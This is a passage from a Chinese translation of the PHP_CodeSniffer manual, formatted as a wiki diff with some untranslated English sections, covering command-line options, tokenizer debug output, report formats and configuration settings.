+$ phpcs /path/to/code/CodeSniffer -v
+Registering sniffs in PEAR standard... DONE (24 sniffs registered)
+Processing AbstractDocElement.php [1093 tokens in 303 lines]... DONE in < 1 second (0 errors, 1 warnings)
+Processing AbstractParser.php [2360 tokens in 558 lines]... DONE in 2 seconds (0 errors, 1 warnings)
+Processing ClassCommentParser.php [923 tokens in 296 lines]... DONE in < 1 second (2 errors, 0 warnings)
+Processing CommentElement.php [988 tokens in 218 lines]... DONE in < 1 second (1 error, 5 warnings)
+Processing FunctionCommentParser.php [525 tokens in 184 lines]... DONE in 1 second (0 errors, 6 warnings)
+Processing File.php [10968 tokens in 1805 lines]... DONE in 5 seconds (0 errors, 5 warnings)
+Processing Sniff.php [133 tokens in 94 lines]... DONE in < 1 second (0 errors, 0 warnings)
+Processing SniffException.php [47 tokens in 36 lines]... DONE in < 1 second (1 errors, 3 warnings)
+</code>
+
+指定代码规范
+PHP_CodeSniffer 支持多种代码规范，在检测过程中可以使用 
+--standard
+     选项来指定。
+
+
+下面的是示例表述了如何使用 PEAR代码规范
+PEAR代码规范是默认安装的。
+
+来检测 
+myfile.inc
+ 文件。
+
+
+<code>
+Specifying a coding standard to use
+
+    
+
+$ phpcs --standard=PEAR /path/to/code/myfile.inc
+</code>
+
+== Poznámka:  ==
+使用PHP_CodeSniffer规范目录
+规范目录为 PEAR/PHP/CodeSniffer/Standards。
+
+以外的规范，你可以直接指定规范的目录。
+
+<code>
+
+
+Specifying an external coding standard
+
+     
+
+$ phpcs --standard=/path/to/MyStandard /path/to/code/myfile.inc
+
+</code>
+
+获取已安装的代码规范列表
+使用 -i 选项可以打印出 PHP_CodeSniffer 当前安装的代码规范列表。示例如下：
+
+<code>
+Generating a list of installed coding standards
+
+
+$ phpcs -i
+The installed coding standards are Zend, PEAR, PHPCS, Squiz and MySource
+</code>
+
+====== 高级使用 ======
+指定文件扩展名
+PHP_CodeSniffer 默认仅检测 .inc 或 .php 文件，你可以通过 --extensions     选项来指定需要检测的文件扩展名。示例如下：
+
+<code>
+Checking .php files only
+
+
+$ phpcs --extensions=php /path/to/code
+
+</code>
+
+<code>
+Checking .php, .inc and .lib files only
+
+
+$ phpcs --extensions=php,inc,lib /path/to/code
+</code>
+
+== Poznámka:  ==
+在明确指定需要检测的文件名时 
+--extensions
+ 选项将会被忽略掉。
+
+
+在下面的例子中指定文件的后缀和 
+--extensions
+       选项是不相符的，但并不影响检测。
+
+
+<code>
+$ phpcs --extensions=php /path/to/code/main.inc
+</code>
+
+在检测目录时，不在指定后缀范围内的文件将会被忽略掉。
+
+
+忽略文件或文件夹
+在检测大量文件时我们可以使用 --ignore 选项方便的忽略掉个别文件或文件夹。
+
+
+下面的例子中 tests 和 data 文件夹中的文件将会被全部忽略。
+
+
+<code>
+Ignoring test and data files
+
+
+$ phpcs --ignore=*/tests/*,*/data/* /path/to/code
+
+</code>
+
+== Poznámka:  ==
+你也可以通过在文件头部添加标识注释来忽略对该文件的检测。
+
+
+示例如下：
+
+
+<code>
+<?php
+// @codingStandardsIgnoreFile
+$xmlPackage = new XMLPackage;
+$xmlPackage['error_code'] = get_default_error_code_value();
+$xmlPackage->send();
+?>
+</code>
+
+忽略文件部分内容
+部分代码可能出于某种原因不能按照当前的代码规范书写。如在写某些库的扩展
+如Smarty的函数扩展。
+
+或Web Service时。我们可以使用行内注释来忽略掉该部分。示例如下：
+
+<code>
+Ignoring parts of a file using comments
+
+
+$xmlPackage = new XMLPackage;
+// @codingStandardsIgnoreStart
+$xmlPackage['error_code'] = get_default_error_code_value();
+// @codingStandardsIgnoreEnd
+$xmlPackage->send(); 
+</code>
+
+指定Sniff检测
+PHP_CodeSniffer默认会使用指定代码规范的所有
+sniff
+进行检测。     有时为了集中解决某一问题，我们可以使用
+ --sniffs
+ 选项指定     
+sniff
+ 集中检测某一问题。示例如下：
+
+<code>
+Checking files for two specific sniffs only
+
+
+$ phpcs --sniffs=Generic.PHP.LowerCaseConstant,PEAR.WhiteSpace.ScopeIndent /path/to/code
+</code>
+
+== Poznámka:  ==
+使用 -s       选项可以在打印报告时指出警告或错误对应的
+sniff
+名称。示例如下：
+
+<code>
+
+$ phpcs -s /phpcsTest/optStest.php
+FILE: /phpcsTest/optStest.php
+--------------------------------------------------------------------------------
+FOUND 4 ERROR(S) AND 3 WARNING(S) AFFECTING 6 LINE(S)
+--------------------------------------------------------------------------------
+  2 | ERROR   | Missing file doc comment (PEAR.Commenting.FileComment)
+  7 | ERROR   | No space found after comma in function call
+    |         | (PEAR.Functions.FunctionCallArgumentSpacing)
+ 16 | ERROR   | You must use "/**" style comments for a function comment
+    |         | (PEAR.Commenting.FunctionComment)
+ 16 | ERROR   | Opening brace should be on a new line
+    |         | (PEAR.Functions.FunctionDeclaration)
+ 25 | WARNING | Line exceeds 85 characters; contains 119 characters
+    |         | (PEAR.Files.LineLength.LineTooLong)
+ 28 | WARNING | Line exceeds 85 characters; contains 108 characters
+    |         | (PEAR.Files.LineLength.LineTooLong)
+ 51 | WARNING | Line exceeds 85 characters; contains 89 characters
+    |         | (PEAR.Files.LineLength.LineTooLong)
+--------------------------------------------------------------------------------
+</code>
+
+Filtering Errors and Warnings Based on Severity
+<note warning>
+译者使用的 CodeSniffer 1.2.2 未测试出该功能。
+
+</note>
+By default, PHP_CodeSniffer assigns a severity of 5 to all errors     and warnings. Standards, especially custom standards, may change the     severity of some messages so they are hidden by default or even so that     they are raised to indicate greater importance. PHP_CodeSniffer allows you     to decide what the minimum severity level must be to show a message in its     report using the --severity command line argument.
+
+
+<code>
+Hiding errors and warnings with a severity less than 3
+
+
+$ phpcs --severity=3 /path/to/code
+</code>
+
+You can specify different values for errors and warnings using the     --error-severity and --warning-severity command line arguments.
+
+
+<code>
+Showing all errors but only warnings with a severity of 8 or more
+
+
+$ phpcs --error-severity=1 --warning-severity=8 /path/to/code 
+</code>
+
+== Poznámka:  ==
+Setting the severity of warnings to 0 is the same as using the -n       command line argument. If you set the severity of errors to 0       PHP_CodeSniffer will not show any errors, which may be useful if you       just want to show the warnings.
+
+== Poznámka:  ==
+This feature is particularly useful during manual code reviews.       During normal development or an automated build, you may want to only       check code formatting issues while during a code review you may wish to       show less severe errors and warnings that may need manual peer       review.
+
+空格与制表符
+大部分PHP_CodeSniffer的代码规范并不建议使用制表符。您可以使用自己定制的sniff来检测，也可以使用     PHP_CodeSniffer 在检测前替换制表符为空格。
+
+
+== Poznámka:  ==
+PHP_CodeSniffer 并不会将源文件中的制表符替换为空格。其仅将待检测 Token       进行了转换，使代码通过当前规范检测。
+
+下面的代码将会使基于制表符的代码通过需要1到4个空格的规范检测。
+原文为：In the following example, PHP_CodeSniffer will replace all         tabs in the files being checked with between 1 and 4 spaces, depending         on the column the tab indents to.
+
+
+
+<code>
+Converting tabs to spaces
+
+
+$ phpcs --tab-width=4 /path/to/code
+</code>
+
+配置选项
+PHP_CodeSniffer有许多配置选项可供设置。在某些需要特别设置的检测前也可以通过命令行来进行动态设置。 
+**查看所有选项**。
+
+
+使用 
+--config-set
+ 设定配置选项的语法如下：
+
+
+<code>
+Setting a configuration option
+
+
+$ phpcs --config-set <option> <value>
+</code>
+
+删除配置选项
+PHP_CodeSniffer允许删除指定配置选项，使其使用默认值。
+
+
+使用 
+--config-delete
+ 删除配置选项的语法如下：
+
+
+<code>
+Deleting a configuration option
+
+
+$ phpcs --config-delete <option>
+</code>
+
+查看配置选项
+使用 
+--config-show
+ 查看配置选项的语法如下：
+
+<code>
+Viewing configuration options
+
+
+$ phpcs --config-show
+Array
+(
+    [default_standard] => PEAR
+    [zend_ca_path] => /path/to/ZendCodeAnalyzer
+)
+</code>
+
+分词详情
+== Poznámka:  ==
+该功能仅辅助调试。开启该功能将明显增加内容输出量和脚本执行时间。
+
+PHP_CodeSniffer输出包括多个详情级别。 使用 
+-vv
+     （二级详情）选项可以打印出一级详情（源码行数、分析时长）和分词情况。
+
+
+分词详情逐步输出 结构视图、范围视图和层级视图（Bracket Map,Scope Map and Level     Map）。
+原文并没有结构视图（Bracket Map），这里是译者根据测试结果添加的。
+
+
+
+范围视图
+下面的例子展示了范围视图：
+
+
+<code>
+<?php
+if ($condition) {
+    echo 'Condition was true';
+}
+?> 
+</code>
+
+范围视图输出如下：
+
+
+<code>
+Sample scope map output
+
+$ phpcs --vv /path/to/code/myfile.php > vv.log 
+$ sed -n -e '/\*\*\* START SCOPE MAP \*\*\*/, /\*\*\* END SCOPE MAP \*\*\*/p' vv.log | more
+
+*** START SCOPE MAP ***
+Start scope map at 1: T_IF => if
+Process token 2 []: T_WHITESPACE =>  
+Process token 3 []: T_OPEN_PARENTHESIS => (
+Process token 6 []: T_WHITESPACE =>  
+Process token 7 []: T_OPEN_CURLY_BRACKET => {
+=> Found scope opener for 1 (T_IF)
+Process token 8 [opener:7;]: T_WHITESPACE => \n
+Process token 9 [opener:7;]: T_WHITESPACE =>     
+Process token 10 [opener:7;]: T_ECHO => echo
+Process token 11 [opener:7;]: T_WHITESPACE =>  
+Process token 12 [opener:7;]: T_CONSTANT_ENCAPSED_STRING => 'Condition was true'
+Process token 13 [opener:7;]: T_SEMICOLON => ;
+Process token 14 [opener:7;]: T_WHITESPACE => \n
+Process token 15 [opener:7;]: T_CLOSE_CURLY_BRACKET => }
+=> Found scope closer for 1 (T_IF)
+*** END SCOPE MAP ***
+</code>
+
+范围视图中包括以下几段信息：
+
+
+  * 位置 1 为 if 标记 (在 0 位置的标记为 PHP 起始标记)。
+  * 位置 7 为 if 代码段起始标记（左花括号）。
+  * 位置 15 为 if 代码段结束标记（右花括号）。
+  * 位置 8 - 15 内的代码均包含在 if 语句范围内。
+层级视图
+下面的例子展示了层级视图：
+
+
+<code>
+<?php
+if ($condition) {
+    echo 'Condition was true';
+}
+?> 
+</code>
+
+层级视图输出如下：
+
+
+<code>
+Sample level map output
+
+$ phpcs --vv /path/to/code/myfile.php > vv.log 
+$ sed -n -e '/\*\*\* START LEVEL MAP \*\*\*/, /\*\*\* END LEVEL MAP \*\*\*/p' vv.log | more
+
+ *** START LEVEL MAP ***
+Process token 0 on line 1 [lvl:0;]: T_OPEN_TAG => <?php\n
+Process token 1 on line 2 [lvl:0;]: T_IF => if
+Process token 2 on line 2 [lvl:0;]: T_WHITESPACE =>  
+Process token 3 on line 2 [lvl:0;]: T_OPEN_PARENTHESIS => (
+Process token 4 on line 2 [lvl:0;]: T_VARIABLE => $condition
+Process token 5 on line 2 [lvl:0;]: T_CLOSE_PARENTHESIS => )
+Process token 6 on line 2 [lvl:0;]: T_WHITESPACE =>  
+Process token 7 on line 2 [lvl:0;]: T_OPEN_CURLY_BRACKET => {
+=> Found scope opener for 1 (T_IF)
+    * level increased *
+    * token 1 (T_IF) added to conditions array *
+    Process token 8 on line 2 [lvl:1;conds;T_IF;]: T_WHITESPACE => \n
+    Process token 9 on line 3 [lvl:1;conds;T_IF;]: T_WHITESPACE =>     
+    Process token 10 on line 3 [lvl:1;conds;T_IF;]: T_ECHO => echo
+    Process token 11 on line 3 [lvl:1;conds;T_IF;]: T_WHITESPACE =>  
+    Process token 12 on line 3 [lvl:1;conds;T_IF;]: T_CONSTANT_ENCAPSED_STRING => 'Condition was true'
+    Process token 13 on line 3 [lvl:1;conds;T_IF;]: T_SEMICOLON => ;
+    Process token 14 on line 3 [lvl:1;conds;T_IF;]: T_WHITESPACE => \n
+    Process token 15 on line 4 [lvl:1;conds;T_IF;]: T_CLOSE_CURLY_BRACKET => }
+    => Found scope closer for 7 (T_OPEN_CURLY_BRACKET)
+    * token T_IF removed from conditions array *
+    * level decreased *
+Process token 16 on line 4 [lvl:0;]: T_WHITESPACE => \n
+Process token 17 on line 5 [lvl:0;]: T_CLOSE_TAG => ?>\n
+*** END LEVEL MAP ***
+</code>
+
+层级视图中包括以下几段信息：
+
+
+  * if 语句的范围起始标志在位置 7 。
+  * 位置 8 - 15 均在 if 局域范围内，属于层级 1。并说明 if 的范围在一个条件范围内便结束了。
+层级视图常被用来判定缩进格式，比如层级为 4 则需要前缀16个空格作为缩进。也可以用来判定一些特殊标记在特殊范围内的意义，如     
+function
+ 在 
+class
+ 内则为     
+method
+ 。
+
+
+分词进度详情
+== Poznámka:  ==
+该功能仅辅助调试。开启该功能将明显增加内容输出量和脚本执行时间。
+
+PHP_CodeSniffer输出包括多个详情级别。 使用 
+-vv
+v     （三级详情）选项可以打印包括一二级详情的内容和文件检测进度信息。
+
+
+下面的例子展示了分词进度详情：
+
+
+<code>
+<?php
+if ($condition) {
+    echo 'Condition was true';
+}
+?> 
+</code>
+
+分词进度详情如下：
+
+
+<code>
+Sample token processing output
+
+
+*** START TOKEN PROCESSING ***
+Process token 0: T_OPEN_TAG => <?php\n
+    Processing PEAR_Sniffs_Commenting_FileCommentSniff... DONE in 0.001 seconds
+    Processing PEAR_Sniffs_Files_LineLengthSniff... DONE in 0.0004 seconds
+    Processing PEAR_Sniffs_PHP_DisallowShortOpenTagSniff... DONE in 0.0001 seconds
+Process token 1: T_IF => if
+    Processing PEAR_Sniffs_ControlStructures_ControlSignatureSniff... DONE in 0.0008 seconds
+    Processing PEAR_Sniffs_WhiteSpace_ScopeClosingBraceSniff... DONE in 0.0248 seconds
+    Processing PEAR_Sniffs_WhiteSpace_ScopeIndentSniff... DONE in 0.0004 seconds
+Process token 2: T_WHITESPACE =>  
+Process token 3: T_OPEN_PARENTHESIS => (
+Process token 4: T_VARIABLE => $condition
+Process token 5: T_CLOSE_PARENTHESIS => )
+Process token 6: T_WHITESPACE =>  
+Process token 7: T_OPEN_CURLY_BRACKET => {
+Process token 8: T_WHITESPACE => \n
+Process token 9: T_WHITESPACE =>     
+Process token 10: T_ECHO => echo
+Process token 11: T_WHITESPACE =>  
+Process token 12: T_CONSTANT_ENCAPSED_STRING => 'Condition was true'
+Process token 13: T_SEMICOLON => ;
+Process token 14: T_WHITESPACE => \n
+Process token 15: T_CLOSE_CURLY_BRACKET => }
+Process token 16: T_WHITESPACE => \n
+Process token 17: T_CLOSE_TAG => ?>\n
+*** END TOKEN PROCESSING ***
+</code>
+
+每个标记的 ID、类型和具体内容都会被打印出来，还有检查标记所使用的 sniff 名称和检查耗时。
+
+
+上例中标记 1 为 if 关键词，检查它使用了三个 sniff ,分别为 ControlSignature     sniff、ScopeClosingBrace sniff 和 ScopeIndent sniff。 其中 ScopeClosingBrace     sniff 检查最慢，使用了 0.0248 秒。
+
+
+有趣的是只有在 0、1 两个标记后有 sniff     的信息。这是PHP_CodeSniffer的常规处理方式，监听特殊的标记并在其后处理一系列的标记。
+
+
+例如 ScopeIndentSniff 仅在 if 标记处显示，但实际上它检查了 if 语句范围内所有行的缩进情况。
+
+
+====== 报表 ======
+打印简要和详细报告
+== Poznámka:  ==
+基本打印说明请查看 
+**使用** 章节。
+
+在使用详细和简要模式打印警告和错误信息时，我们可以使用 --sniffs 选项来指定检测用的     
+sniff
+ 。使用 -s 选项可以查看各条信息对应的 
+sniff
+     名称。
+
+<code>
+Sample PHP_CodeSniffer full report with source codes
+
+
+$ phpcs -s /path/to/code/myfile.php
+
+FILE: /path/to/code/myfile.php
+--------------------------------------------------------------------------------
+FOUND 5 ERROR(S) AND 1 WARNING(S) AFFECTING 5 LINE(S)
+--------------------------------------------------------------------------------
+  2 | ERROR   | Missing file doc comment (PEAR.Commenting.FileComment)
+ 20 | ERROR   | PHP keywords must be lowercase; expected "false" but found
+    |         | "FALSE" (Generic.PHP.LowerCaseConstant)
+ 47 | ERROR   | Line not indented correctly; expected 4 spaces but found 1
+    |         | (PEAR.WhiteSpace.ScopeIndent)
+ 47 | WARNING | Equals sign not aligned with surrounding assignments
+    |         | (Generic.Formatting.MultipleStatementAlignment)
+ 51 | ERROR   | Missing function doc comment
+    |         | (PEAR.Commenting.FunctionComment)
+ 88 | ERROR   | Line not indented correctly; expected 9 spaces but found 6
+    |         | (PEAR.WhiteSpace.ScopeIndent)
+--------------------------------------------------------------------------------
+</code>
+
+<code>
+Sample PHP_CodeSniffer summary report with source codes
+
+
+$ phpcs -s --report=summary /path/to/code
+
+PHP CODE SNIFFER REPORT SUMMARY
+--------------------------------------------------------------------------------
+FILE                                                            ERRORS  WARNINGS
+--------------------------------------------------------------------------------
+/path/to/code/myfile.inc                                        5       0
+/path/to/code/yourfile.inc                                      1       1
+/path/to/code/ourfile.inc                                       0       2
+--------------------------------------------------------------------------------
+A TOTAL OF 6 ERROR(S) AND 3 WARNING(S) WERE FOUND IN 3 FILE(S)
+--------------------------------------------------------------------------------
+
+
+PHP CODE SNIFFER VIOLATION SOURCE SUMMARY
+--------------------------------------------------------------------------------
+SOURCE                                                                     COUNT
+--------------------------------------------------------------------------------
+PEAR.WhiteSpace.ScopeIndent                                                3
+PEAR.Commenting.FileComment                                                2
+Generic.PHP.LowerCaseConstant                                              2
+Generic.Formatting.MultipleStatementAlignment                              1
+PEAR.Commenting.FunctionComment                                            1
+--------------------------------------------------------------------------------
+A TOTAL OF 9 SNIFF VIOLATION(S) WERE FOUND IN 5 SOURCE(S)
+--------------------------------------------------------------------------------
+</code>
+
+打印sniff使用报告
+PHP_CodeSniffer可以输出关于sniff使用的摘要报告。使用     
+--report=source
+ 即可打印出如下报告：
+
+
+<code>
+Sample PHP_CodeSniffer source output
+
+
+$ phpcs --report=source /path/to/code
+
+PHP CODE SNIFFER VIOLATION SOURCE SUMMARY
+--------------------------------------------------------------------------------
+STANDARD    CATEGORY            SNIFF                                      COUNT
+--------------------------------------------------------------------------------
+Generic     PHP                 Lower case constant                        4
+PEAR        White space         Scope indent                               3
+PEAR        Commenting          File comment                               1
+--------------------------------------------------------------------------------
+A TOTAL OF 8 SNIFF VIOLATION(S) WERE FOUND IN 3 SOURCE(S)
+--------------------------------------------------------------------------------
+</code>
+
+使用 -s 可以打印出 sniff 源名称（上例中sniff的名称为 阅读友好名称）。
+
+
+<code>
+Sample PHP_CodeSniffer source code output
+
+
+$ phpcs -s --report=source /path/to/code
+
+PHP CODE SNIFFER VIOLATION SOURCE SUMMARY
+--------------------------------------------------------------------------------
+SOURCE                                                                     COUNT
+--------------------------------------------------------------------------------
+Generic.PHP.LowerCaseConstant                                              4
+PEAR.WhiteSpace.ScopeIndent                                                3
+PEAR.Commenting.FileComment                                                1
+--------------------------------------------------------------------------------
+A TOTAL OF 8 SNIFF VIOLATION(S) WERE FOUND IN 3 SOURCE(S)
+--------------------------------------------------------------------------------
+</code>
+
+打印XML报告
+为了方便分析和使用报告，PHP_CodeSniffer 提供XML格式输出的报告。使用     
+--report=xml
+ 即可输出如下例所示的报告：
+
+<code>
+Sample PHP_CodeSniffer XML output
+
+
+$ phpcs --report=xml /path/to/code
+
+<?xml version="1.0" encoding="UTF-8"?>
+<phpcs version="1.0.0">
+ <file name="/path/to/code/myfile.php" errors="4" warnings="1">
+  <error line="2" column="1" source="PEAR.Commenting.FileComment">Missing file doc comment</error>
+  <error line="20" column="43" source="Generic.PHP.LowerCaseConstant">PHP keywords must be lowercase; expected &quot;false&quot; but found &quot;FALSE&quot;</error>
+  <error line="47" column="1" source="PEAR.WhiteSpace.ScopeIndent">Line not indented correctly; expected 4 spaces but found 1</error>
+  <warning line="47" column="20" source="Generic.Formatting.MultipleStatementAlignment">Equals sign not aligned with surrounding assignments</warning>
+  <error line="51" column="4" source="PEAR.Commenting.FunctionComment">Missing function doc comment</error>
+ </file>
+</phpcs>
+</code>
+
+打印 Checkstyle 报告
+PHP_CodeSniffer可以打印出类似 
+**Checkstyle**     的XML报告，可使用已有 Checkstyle 的报告分析程序进行分析。 使用 --report=checkstyle     即可输出如下例所示的报告：
+
+<code>
+Sample PHP_CodeSniffer Checkstyle output
+
+
+$ phpcs --report=checkstyle /path/to/code
+
+<?xml version="1.0" encoding="UTF-8"?>
+<checkstyle version="1.0.0">
+ <file name="/path/to/code/myfile.php">
+  <error line="2" column="1" severity="error" message="Missing file doc comment" source="PEAR.Commenting.FileComment"/>
+  <error line="20" column="43" severity="error" message="PHP keywords must be lowercase; expected &quot;false&quot; but found &quot;FALSE&quot;" source="Generic.PHP.LowerCaseConstant"/>
+  <error line="47" column="1" severity="error" message="Line not indented correctly; expected 4 spaces but found 1" source="PEAR.WhiteSpace.ScopeIndent"/>
+  <error line="47" column="20" severity="warning" message="Equals sign not aligned with surrounding assignments" source="Generic.Formatting.MultipleStatementAlignment"/>
+  <error line="51" column="4" severity="error" message="Missing function doc comment" source="PEAR.Commenting.FunctionComment"/>
+ </file>
+</checkstyle>
+</code>
+
+打印CSV报告
+PHP_CodeSniffer 可以使用 --report=csv 选项来输出如下CSV报告：
+
+<code>
+Sample PHP_CodeSniffer CSV output
+
+
+$ phpcs --report=csv /path/to/code
+
+File,Line,Column,Severity,Message,Source
+"/path/to/code/myfile.php",2,1,error,"Missing file doc comment",PEAR.Commenting.FileComment
+"/path/to/code/myfile.php",20,43,error,"PHP keywords must be lowercase; expected \"false\" but found \"FALSE\"",Generic.PHP.LowerCaseConstant
+"/path/to/code/myfile.php",47,1,error,"Line not indented correctly; expected 4 spaces but found 1",PEAR.WhiteSpace.ScopeIndent
+"/path/to/code/myfile.php",47,20,warning,"Equals sign not aligned with surrounding assignments",Generic.Formatting.MultipleStatementAlignment
+"/path/to/code/myfile.php",51,4,error,"Missing function doc comment",PEAR.Commenting.FunctionComment
+</code>
+
+== Poznámka:  ==
+CSV报告首行为字段名称，排序可能会因版本更新而不同。在分析报告时字段名应尽量依照首行。
+
+打印Emacs报告
+PHP_CodeSniffer 可以配合 GNU Emacs 输出可在报告和源文件间切换的运行结果。是用 --report=emacs     选项来输出如下报告：
+
+
+<code>
+Sample PHP_CodeSniffer Emacs output
+
+
+$ phpcs --report=emacs /path/to/code
+
+/path/to/code/myfile.php:2:1: error - Missing file doc comment
+/path/to/code/myfile.php:20:43: error - PHP keywords must be lowercase; expected "false" but found "FALSE"
+/path/to/code/myfile.php:47:1: error - Line not indented correctly; expected 4 spaces but found 1
+/path/to/code/myfile.php:47:20: warning - Equals sign not aligned with surrounding assignments
+/path/to/code/myfile.php:51:4: error - Missing function doc comment
+</code>
+
+首先确认Emacs安装了 
+**PHP
+    mode for Emacs**，然后将如下内容存储为 .emacs 文件：
+
+
+<code>
+Sample .emacs file
+
+
+(defun my-php-hook-function ()
+ (set (make-local-variable 'compile-command) (format "phpcs --report=emacs --standard=PEAR %s" (buffer-file-name))))
+(add-hook 'php-mode-hook 'my-php-hook-function)
+</code>
+
+现在你可以使用 
+**编译命令**     和 
+**组合键**     在报告信息和源文件之间切换。
+
+
+打印SVN Blame报告
+PHP_CodeSniffer 可以通过 svn blame 命令来获取警告和错误的提交者信息。使用 --report=svnblame     选项打印如下信息：
+
+
+<code>
+Sample PHP_CodeSniffer SVN Blame output
+
+
+$ phpcs --report=svnblame /path/to/code
+
+PHP CODE SNIFFER SVN BLAME SUMMARY
+--------------------------------------------------------------------------------
+AUTHOR                                                              COUNT (%)
+--------------------------------------------------------------------------------
+jsmith                                                              51 (40.8)
+jblogs                                                              44 (30)
+pdeveloper                                                          43 (10.33)
+jscript                                                             27 (19.84)
+--------------------------------------------------------------------------------
+A TOTAL OF 165 SNIFF VIOLATION(S) WERE COMMITTED BY 4 AUTHOR(S)
+--------------------------------------------------------------------------------
+</code>
+
+上表展示了各提交者违规代码行数与所占其总提交行数的百分比。 例如开发者 
+pdeveloper
+     的违规行数有 43 行，占其所提交行数的比例为 10.33%。开发者 
+jblogs
+ 的违规行数有 44     行，占其所提交行数的比例为 30% 。虽然他们俩的违规行数仅差一行，但显然 
+pdeveloper
+     提交的代码质量比较好。
+
+
+加上 
+-s
+ 选项即可查看各开发者欠缺注意的类型。
+
+
+<code>
+Sample PHP_CodeSniffer SVN Blame output with sources
+
+
+$ phpcs -s --report=svnblame /path/to/code
+
+PHP CODE SNIFFER SVN BLAME SUMMARY
+--------------------------------------------------------------------------------
+AUTHOR   SOURCE                                                     COUNT (%)
+--------------------------------------------------------------------------------
+jsmith                                                              51 (40.8)
+         Squiz.Files.LineLength                                     47
+         PEAR.Functions.FunctionCallSignature                       4
+jblogs                                                              44 (30)
+         Squiz.Files.LineLength                                     40
+         Generic.CodeAnalysis.UnusedFunctionParameter               2
+         Squiz.CodeAnalysis.EmptyStatement                          1
+         Squiz.Formatting.MultipleStatementAlignment                1
+--------------------------------------------------------------------------------
+A TOTAL OF 95 SNIFF VIOLATION(S) WERE COMMITTED BY 2 AUTHOR(S)
+--------------------------------------------------------------------------------
+</code>
+
+使用 -v 选项可将所有作者列出，包括未出现违规代码的作者。
+
+
+<code>
+Sample PHP_CodeSniffer SVN Blame verbose output
+
+
+$ phpcs -v --report=svnblame /path/to/code
+
+PHP CODE SNIFFER SVN BLAME SUMMARY
+--------------------------------------------------------------------------------
+AUTHOR                                                              COUNT (%)
+--------------------------------------------------------------------------------
+jsmith                                                              51 (40.8)
+jblogs                                                              44 (30)
+pdeveloper                                                          43 (10.33)
+jscript                                                             27 (19.84)
+toogood                                                             0 (0)
+--------------------------------------------------------------------------------
+A TOTAL OF 165 SNIFF VIOLATION(S) WERE COMMITTED BY 5 AUTHOR(S)
+--------------------------------------------------------------------------------
+</code>
+
+== Poznámka:  ==
+在检查之前请确认SVN在系统 path 内，且保存了当前版本库的登录用户信息（如果需要的话）。       否则将生成失败。如果没有存储用户名和密码，在每个检测出违规代码的文件是都需要键入一次用户名和密码。
+
+打印Git Blame报告
+和 SVN Blame报告相似， PHP_CodeSniffer可以通过 svn blame 命令来获取警告和错误的提交者信息。 使用     --report=gitblame 选项即可打印出与上方 SVN Blame 相似的报告。
+
+== Poznámka:  ==
+在检查之前请确认GIT在系统 path 内，否则将造成生成失败。
+
+交互模式
+除了直接检查完代码后给出结果， PHP_CodeSniffer支持交互模式。允许在检查完每个文件时暂停。这时你可以按 ENTER     键重新检查代码（检查通过后自动检查下一文件），或者按 S 键忽略当前文件的警告和错误，也可以按 Q 键推出整个检查。
+
+
+使用 
+ -a
+ 选项即可开启交互模式：
+
+
+<code>
+Running interactively
+
+
+$ phpcs -a /path/to/code
+
+FILE: /path/to/code/myfile.php
+--------------------------------------------------------------------------------
+FOUND 5 ERROR(S) AND 1 WARNING(S) AFFECTING 5 LINE(S)
+--------------------------------------------------------------------------------
+  2 | ERROR   | Missing file doc comment
+ 20 | ERROR   | PHP keywords must be lowercase; expected "false" but found
+    |         | "FALSE"
+ 47 | ERROR   | Line not indented correctly; expected 4 spaces but found 1
+ 47 | WARNING | Equals sign not aligned with surrounding assignments
+ 51 | ERROR   | Missing function doc comment
+ 88 | ERROR   | Line not indented correctly; expected 9 spaces but found 6
+--------------------------------------------------------------------------------
+
+<ENTER> to recheck, [s] to skip or [q] to quit :
+</code>
+
+设置报告宽度
+PHP_CodeSniffer默认报告宽度为80个字符（基于屏幕宽度），当遇到长的路径名或信息描述时，其将会被截断分行。为了避免信息被分行，你可以增加报告宽度     。使用 
+-report-width 
+即可：
+
+<code>
+Setting the report width to be 120 characters
+
+
+$ phpcs --report-width=120 --report=summary /path/to/code/myfile.php
+</code>
+
+生成报告文件
+PHP_CodeSniffer 可以将报告结果输出为文件，这在输出 xml、csv 等格式时十分有用。
+
+
+使用 
+--report-file 
+ 命令输出文件：
+
+
+<code>
+Writing a report to a file
+
+
+$ phpcs --report=xml --report-file=/path/to/file.xml /path/to/code
+</code>
+
+== Poznámka:  ==
+输出文件的同时将输出到控制台。
+
+== Poznámka:  ==
+译者注：
+
+<code>
+$ phpcs --report=xml  /path/to/code > /path/to/file.xml
+</code>
+
+====== 配置选项 ======
+===== PHP_CodeSniffer 配置选项 =====
+设置默认代码规范
+Php_CodeSniffer的默认代码规范为 PEAR       。当检查时未指定代码规范则使用默认。修改默认代码规范的方式如下：
+
+<code>
+Setting the default standard to be the Zend coding standard
+
+     
+
+$ phpcs --config-set default_standard Zend
+</code>
+
+设置报告默认格式
+PHP_CodeSniffer默认将输出详情报告，修改报告默认格式方式如下。
+
+<code>
+Setting the default report format to be the summary report
+
+     
+
+$ phpcs --config-set report_format summary
+</code>
+
+隐藏警告
+PHP_CodeSniffer默认将输出警告和错误。你可以使用 
+-n
+       选项来抑制警告的显示，也可以通过以下设置使其默认不显示。
+
+<code>
+Hiding warnings by default
+
+     
+
+$ phpcs --config-set show_warnings 0
+</code>
+
+== Poznámka:  ==
+默认隐藏警告时。你可以使用 
+-w
+ 来显示警告。
+
+Changing the Default Severity Levels
+<note warning>
+译者使用的 CodeSniffer 1.2.2 未测试出该功能。
+
+</note>
+By default, PHP_CodeSniffer will show all errors and warnings with       a severity level of 5 or greater. You can change these settings for a       single script run by using the --severity, --error-severity and       --warning-severity command line arguments, but you can also change the       default settings if you prefer.
+
+<code>
+Changing the default severity level to show all errors and warnings
+
+     
+
+$ phpcs --config-set severity 1
+</code>
+
+<code>
+Changing the default severity levels to show all errors but only some warnings
+
+     
+
+$ phpcs --config-set error_severity 1
+$ phpcs --config-set warning_severity 8
+</code>
+
+== Poznámka:  ==
+Setting the severity of warnings to 0 is the same as using the         -n command line argument. If you set the severity of errors to 0         PHP_CodeSniffer will not show any errors, which may be useful if you         just want to show the warnings.
+
+设置报告默认宽度
+PHP_CodeSniffer默认报告宽度为80个字符（基于屏幕宽度），当遇到长的路径名或信息描述时，其将会被截断分行。为了避免信息被分行，你可以使用       
+ -report-width
+ 来修改报告宽度。也可修改默认报告宽度，方式如下。
+
+<code>
+Setting the default report width to be 120 characters
+
+     
+
+$ phpcs --config-set report_width 120
+</code>
+
+设置制表符默认宽度
+默认情况下 PHP_CodeSniffer 不会将代码中的制表符转换为空格以供检查。除非在命令中指定了 --tab-width       。
+
+
+你可以设置默认制表符宽度，强制将制表符转换为空格：
+
+
+<code>
+Setting the default tab width to be 4 spaces
+
+     
+
